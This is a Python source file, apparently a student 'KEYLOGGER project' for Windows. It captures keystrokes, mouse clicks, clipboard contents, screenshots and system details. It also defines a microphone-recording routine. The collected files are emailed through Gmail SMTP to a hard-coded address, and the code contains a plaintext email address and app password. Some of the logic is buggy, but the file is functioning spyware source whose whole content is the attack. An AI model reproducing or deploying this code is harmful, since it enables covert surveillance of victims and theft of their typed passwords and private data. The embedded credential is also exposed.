from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pws
from pynput.mouse import Listener as MouseListener
import threading
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key
from pynput.keyboard import Listener as KeyboardListener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "system_info.txt"
mouse_information = "mouse_info.txt"
clipboard_information = "clipboard_info.txt"
bios_information = "bios_info.txt"
comp_information = "computer_info.txt"
hotfix_information = "hotfix_info.txt"
process_information = "process_info.txt"
service_information = "service_info.txt"
system_information = "system_info.txt"
volume_information = "volume_info.txt"
network_adapter_information = "network_adapter_info.txt"
audio_information = "audio_info.wav"
screenshot_information = "screenshot.png"


directory = "C:\\Users\\neham\\OneDrive\\Desktop\\py-progs\\cybersecurity"
system_file_path = os.path.join(directory, system_information)
keys_file_path = os.path.join(directory, keys_information)
clipboard_file_path = os.path.join(directory, clipboard_information)
mouse_file_path = os.path.join(directory, mouse_information)
bios_file_path = os.path.join(directory, bios_information)
comp_file_path = os.path.join(directory, comp_information)
hotfix_file_path = os.path.join(directory, hotfix_information)
process_file_path = os.path.join(directory, process_information)
service_file_path = os.path.join(directory, service_information)
system_file_path = os.path.join(directory, system_information)
volume_file_path = os.path.join(directory, volume_information)
network_adapter_path = os.path.join(directory, network_adapter_information)
audio_path = os.path.join(directory, audio_information)
screenshot_path = os.path.join(directory, screenshot_information)


microphone_time = 10
time_iteration = 15
number_of_iteration_end = 3

number_of_iteration = 0
currentTime = time.time()
stopping_time = time.time() + time_iteration

email_address = "rudysec9@gmail.com"
password = "gazm mttz qolz hjvu"
toaddr = "rudysec9@gmail.com"


def send_mail(filename, attachment, toaddr, email_address, password):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "keylog_text_file"
    body = "Test Records of the KEYLOGGER project"
    msg.attach(MIMEText(body, 'plain'))

    for filename, attachment in zip(filename, attachment):
        attachment_file = open(attachment, 'rb')
        attachment_data = attachment_file.read()
        attachment_file.close()
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment_data)
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', 'attachment', filename=filename)
        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


filename = ["key_log.txt", "system_info.txt", "clipboard_info.txt", "mouse_info.txt", "bios_info.txt", "computer_info.txt",
            "hotfix_info.txt", "process_info.txt", "service_info.txt", "volume_info.txt", "network_adapter_info.txt", "audio_info.wav", "screenshot.png"]
attachment = [keys_file_path, system_file_path, clipboard_file_path, mouse_file_path, bios_file_path,
              comp_file_path, hotfix_file_path, process_file_path, service_file_path, volume_file_path, network_adapter_path, audio_path, screenshot_path]


def log_mouse_click(x, y, button, pressed):
    if pressed:
        with open(mouse_file_path, "a") as f:
            f.write(f"Mouse clicked at ({x}, {y}) with {button}\n")


stop_threads = False


def computer_information():
    with open(system_file_path, "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://ipfy.org").text
            f.write("Public IP Address:" + public_ip)

        except Exception:
            f.write("couldn't get Public IP Address (most likely max query)" + '\n')
            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("system: " + platform.system() +
                    " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("private IP Address: " + IPaddr + '\n')


computer_information()


def copy_clipboard():
    with open(clipboard_file_path, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")


copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(audio_path, fs, myrecording)


def screenshot():
    im = ImageGrab.grab()
    im.save(screenshot_path)


screenshot()

count = 0
keys = []

def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

def write_file(keys):
        with open(keys_file_path, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\\n')
                    """f.close()"""
                elif k.find("Key") == -1:
                    f.write(k)
                    """f.close()"""

def on_release(key):
        global stop_threads
        if key == Key.esc:
            stop_threads = True
            return False
        if currentTime > stopping_time:
            stop_threads = True
            return False

keyboard_listener = KeyboardListener(
on_press=on_press, on_release=on_release)

def keyboard_listener_function():
    with keyboard_listener:
            keyboard_listener.join()

keyboard_thread = threading.Thread(target=keyboard_listener_function)
keyboard_thread.start()

mouse_listener = MouseListener(on_click=log_mouse_click)

def mouse_listener_function():
        with mouse_listener:
            while not stop_threads:
                time.sleep(0.1)

mouse_thread = threading.Thread(target=mouse_listener_function)
mouse_thread.start()

keyboard_thread.join()
mouse_thread.join()

if currentTime > stopping_time:
    with open(keys_file_path, "w") as f:
        f.write(" Stopped by timeout /n ")

screenshot()
send_mail(screenshot_information, screenshot_path, toaddr, email_address, password)
copy_clipboard()

number_of_iteration_end += 1
currentTime = time.time() + time_iteration

send_mail(filename, attachment, toaddr, email_address, password)

powershell_code = pws.powershell_code
